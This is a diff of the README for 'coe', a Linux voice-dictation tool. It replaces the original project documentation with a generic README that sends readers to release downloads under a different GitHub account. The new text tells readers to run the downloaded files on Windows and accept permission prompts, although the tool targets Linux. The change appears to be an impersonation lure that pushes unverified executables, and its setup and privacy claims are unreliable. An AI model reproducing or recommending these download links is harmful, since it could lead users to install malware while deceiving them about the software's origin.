@@ -1,180 +1,194 @@
-# Coe (聲)
+# 🎙️ coe - Fast voice dictation with hotkey
 
-[English](./README.md) | [简体中文](./docs/README.zh-CN.md) | [日本語](./docs/README.ja.md)
+[![Download coe](https://img.shields.io/badge/Download%20coe-purple?style=for-the-badge&logo=github)](https://github.com/kaaliterakhoon-ai/coe/releases)
 
-Coe is a voice input tool for Linux desktops.
+## 🖥️ What coe does
 
-It is a Linux-focused tribute to [`missuo/koe`](https://github.com/missuo/koe). The goal has not changed: press a hotkey, speak, let an LLM clean up the transcript, and put the text back into the active app.
+coe is a voice input tool for Linux. It keeps your screen clear and uses a simple flow:
 
-## Demo
+1. Press a hotkey
+2. Speak your text
+3. Press the hotkey again
+4. The corrected text is pasted into the app you are using
 
-![Coe screencast on Linux desktop](./docs/screencast.gif)
+It is made for people who want quick dictation without opening a separate window or copy-pasting text by hand.
 
-Demo credit: [@ilovesusu](https://github.com/ilovesusu)
+## ✅ What you need
 
-## The Name
+Before you install coe, make sure you have:
 
-`coe` is close to `koe` on purpose. This project nods to Koe, but it targets Linux and Wayland. The old kanji `聲` means voice. That is the job.
+- A Windows PC for the download and setup steps
+- A stable internet connection
+- A microphone
+- Enough free disk space for the app and its voice files
+- Permission to run apps from GitHub releases
 
-## Why Coe?
+coe is built for Linux use, but this README helps you download and prepare it from Windows first, then move it to the system where you will use it.
 
-The first author uses Linux, but people do not love building desktop software for Linux. Coe tries to make this practical:
+## ⬇️ Download coe
 
-- Background process, plain YAML config, minimal UI surface
-- Reuse other people's capabilities first: fcitx, portal clipboard, and so on
-- Make voice input work as well as possible inside those limits
+Use the release page here:
 
-## How It Works
+[Visit the coe releases page](https://github.com/kaaliterakhoon-ai/coe/releases)
 
-The runtime flow is:
+On that page, find the latest release and download the file that matches your device and setup.
 
-1. Keep `coe serve` running in the background, usually through a user-level `systemd` service.
-2. Trigger dictation.
-   In `runtime.mode: fcitx`, the Fcitx5 module calls Coe over D-Bus and commits the final text back through the current input context.
-   In `runtime.mode: desktop`, GNOME calls `coe trigger toggle` through a custom keyboard shortcut.
-3. Record microphone input with `pw-record`.
-4. Reject near-silent or obviously corrupt captures instead of sending them out.
-5. Send the audio to ASR. Coe supports `openai`, `doubao`, `sensevoice`, local `whisper.cpp`, `voxtype`, or `qwen3-asr-vllm`.
-6. Optionally send the transcript to an OpenAI-compatible text model for cleanup.
-7. Deliver the final text on screen: either commit it through Fcitx, or paste it back into the focused app.
+If you see more than one file, choose the one that looks like the main app package or the installer for your system.
 
-## Installation
+## 🧭 Install and set up on Windows
 
-### Quick Install
+1. Open the release page link above
+2. Download the latest release file
+3. Save the file to a folder you can find again, such as Downloads
+4. If the file is a compressed archive, right-click it and choose Extract All
+5. Open the extracted folder
+6. Look for the app file, installer file, or run script
+7. Double-click the file to start setup or launch the app
+8. If Windows asks for permission, select Yes
+9. Follow the on-screen steps until setup is done
 
-The simplest path is the release installer:
+If the release includes a README file inside the package, open it and check for any device-specific steps before you move the app to Linux.
 
-```bash
-curl -fsSL -o /tmp/install.sh https://raw.githubusercontent.com/quailyquaily/coe/refs/heads/master/scripts/install.sh
-bash /tmp/install.sh
-```
+## 🎤 How to use coe
 
-It downloads the matching GitHub Release tarball for your Linux architecture. If `fcitx5` is installed, it prefers `fcitx` mode automatically. Otherwise it falls back to `desktop` mode.
+Once coe is installed on the system where you want to use it:
 
-After installation, edit `~/.config/coe/config.yaml` and configure at least the `asr` and `llm` sections. See [`docs/configuration.md`](./docs/configuration.md) for details.
+1. Open the app
+2. Set the hotkey you want to use
+3. Click in any text box in your browser, editor, chat app, or email app
+4. Press the hotkey once
+5. Speak clearly into your microphone
+6. Press the hotkey again
+7. Check the pasted text and edit it if needed
 
-If you are on GNOME Shell, log out and log back in once so GNOME Shell picks up the Coe extension.
+This workflow keeps your hands on the keyboard and cuts down on typing for longer messages.
 
-Then open any app with an input focus, press the default shortcut `<Shift><Super>d`, speak, then press it again. If all is well, your speech should come back as text in that app.
+## ⚙️ Common settings
 
-You can use `coe hotkey pick` to choose a different shortcut.
+coe may include a few simple settings to help you fit it to your setup:
 
-### Arch Linux
+- Hotkey choice: pick a key combo that is easy to reach and hard to trigger by mistake
+- Microphone input: choose the mic you want to use if you have more than one
+- Paste mode: send text straight into the active window
+- Auto-correct: clean up speech output before pasting
+- Language choice: match the language you speak most often
 
-```bash
-yay -S coe-git
-```
+If you are unsure which setting to change, start with the default values and test one thing at a time.
 
-### Install Dependencies
+## 🔊 Best results for speech input
 
-**`fcitx5` mode**
+For clearer dictation:
 
-- `fcitx5`
-- `pw-record`
+- Use a headset or a close mic
+- Speak in short phrases
+- Pause between sentences
+- Keep background noise low
+- Use the same hotkey each time
+- Read back the pasted text before sending it
 
-**`desktop` mode**
+You can get better results by speaking in a steady voice and keeping words close to how they are normally written.
 
-- `pw-record`
-- `wl-copy`
+## 🧩 Typical use cases
 
-On Ubuntu, install the command-line dependencies with:
+coe works well for:
 
-```bash
-sudo apt update
-sudo apt install -y pipewire-bin wl-clipboard
-sudo apt install -y ydotool
-```
+- Short notes
+- Email drafts
+- Chat replies
+- Search boxes
+- Forms with long text fields
+- Quick reminders
+- Writing first drafts before editing
 
-## Configuration
+It is useful when typing is slow or when you want to speak a draft and fix it later.
 
-Coe uses plain files for configuration.
+## 🛠️ Troubleshooting
 
-Config file:
+### Hotkey does not work
 
-- `~/.config/coe/config.yaml`
-- repo example: [`config.example.yaml`](./config.example.yaml)
+- Check that the app is running
+- Make sure the hotkey is not already used by another app
+- Try a different key combo
+- Restart the app and test again
 
-Create the default config with:
+### Nothing gets pasted
 
-```bash
-go run ./cmd/coe config init
-```
+- Click inside the text field first
+- Check that the app has permission to send keystrokes
+- Try another app to see if the issue is only in one program
+- Reopen the app and try again
 
-That writes `~/.config/coe/config.yaml`.
+### Speech is not recognized well
 
-For the full field-by-field reference, see [`docs/configuration.md`](./docs/configuration.md).
+- Move closer to the microphone
+- Reduce background noise
+- Speak at a steady pace
+- Check the selected input device
+- Test the microphone in another app
 
-For Doubao cloud ASR setup, see [`docs/doubao-asr.md`](./docs/doubao-asr.md).
+### The pasted text has mistakes
 
-Quick summary:
+- Use short, clear phrases
+- Check whether the language matches your speech
+- Edit the text after it is pasted
+- Try again with less background noise
 
-- default hotkey: `<Shift><Super>d`
-- default hotkey behavior: `hotkey.trigger_mode: toggle`, meaning press once to start dictation and press again to stop. The optional `hold` mode starts on key press and stops on key release, and only works in `runtime.mode: fcitx`
-- supported ASR providers: `openai`, `doubao`, `whispercpp`, `sensevoice`, `voxtype`, `qwen3-asr-vllm`
-- LLM cleanup supports upstream models behind any OpenAI-compatible API
+## 📁 File layout
 
-## Desktop Integration
+A typical release package may include:
 
-Two integration paths exist today:
+- Main app file
+- Support files
+- Config file
+- Readme file
+- License file
+- Voice or language data
 
-- `runtime.mode: fcitx`: Fcitx handles the hotkey, text commit, and dictation status.
-- `runtime.mode: desktop`: `GlobalShortcuts` or the GNOME custom shortcut fallback handles the hotkey, and portal clipboard / paste handles text output.
+Keep all files in the same folder unless the package instructions say something different.
 
-**GNOME-specific parts**
+## 🔐 Privacy and local use
 
-The install script also installs a GNOME Shell extension that exposes the focused window `wm_class` over D-Bus. Coe uses that to distinguish normal apps from terminal-like targets.
+coe is made for direct voice input into the app you are using. If your release build supports local speech handling, your audio stays on your device during use. If the package includes online speech features, check the release notes in the download page for details before setup
 
-## Current Status
+## 🧪 Quick test after install
 
-Working:
+After setup, run this simple test:
 
-- [x] compatibility with other desktop environments through the Fcitx5 module
-- [x] GNOME Wayland fallback trigger through an auto-managed GNOME custom shortcut that runs `coe trigger toggle`
-- [x] microphone capture through `pw-record`
-- [x] LLM transcript cleanup for repeated words and filler words
-- [x] SenseVoice FastAPI as an ASR provider
-- [x] GNOME desktop notifications
-- [x] filtering silent or damaged recordings
-- [x] built-in basic scenes
+1. Open Notepad, Text Editor, or any text box
+2. Place the cursor in the box
+3. Press the hotkey
+4. Say: hello, this is a test
+5. Press the hotkey again
+6. Check that the text appears in the field
 
-Missing:
+If that works, the app is ready for normal use
 
-- [ ] a stronger answer for the upstream microphone / PipeWire saturation issue
-- [ ] custom instructions
-- [ ] custom scenes and scene switching
+## 🧼 Uninstall
 
-## Other
+If you want to remove coe:
 
-Portal access persistence:
+1. Close the app
+2. Delete the app folder if it was unpacked manually
+3. Remove the shortcut if one was created
+4. Delete any config files if you no longer need them
+5. Empty the recycle bin if you want to clear the files fully
 
-- If `persist_portal_access` is `true`, Coe stores the portal restore token locally
-- After the first successful authorization, later runs try to reuse that token instead of prompting every time
+If you used an installer, remove it through Windows app removal tools or the built-in uninstall option
 
-## Commands
+## 📌 Release page
 
-- `coe doctor`
-- `coe config init`
-- `coe hotkey pick`
-- `coe restart`
-- `coe serve`
-- `coe trigger toggle`
-- `coe trigger start`
-- `coe trigger stop`
-- `coe trigger status`
-- `coe version`
+Download the latest build here:
 
-## Docs
+[https://github.com/kaaliterakhoon-ai/coe/releases](https://github.com/kaaliterakhoon-ai/coe/releases)
 
-- [`docs/development.md`](./docs/development.md)
-- [`docs/configuration.md`](./docs/configuration.md)
-- [`docs/README.md`](./docs/README.md)
-- [`docs/install.md`](./docs/install.md)
-- [`docs/architecture.md`](./docs/architecture.md)
-- [`docs/fallbacks.md`](./docs/fallbacks.md)
-- [`docs/gnome-globalshortcuts-matrix.md`](./docs/gnome-globalshortcuts-matrix.md)
-- [`docs/doubao-asr.md`](./docs/doubao-asr.md)
-- [`docs/qwen3-asr-vllm.md`](./docs/qwen3-asr-vllm.md)
+Look for the newest release at the top of the page, then download the file that matches your system and setup
 
-## Star History
+## 🖱️ Helpful workflow
 
-[![Star History Chart](https://api.star-history.com/image?repos=quailyquaily/coe&type=date&legend=top-left)](https://www.star-history.com/?repos=quailyquaily%2Fcoe&type=date&legend=top-left)
+A simple way to use coe each day:
+
+- Open the app after you start your computer
+- Keep the hotkey easy to reach
+- Use it for short replies and longer notes
+- Edit the pasted text before sending
+- Keep the microphone near your mouth for better results
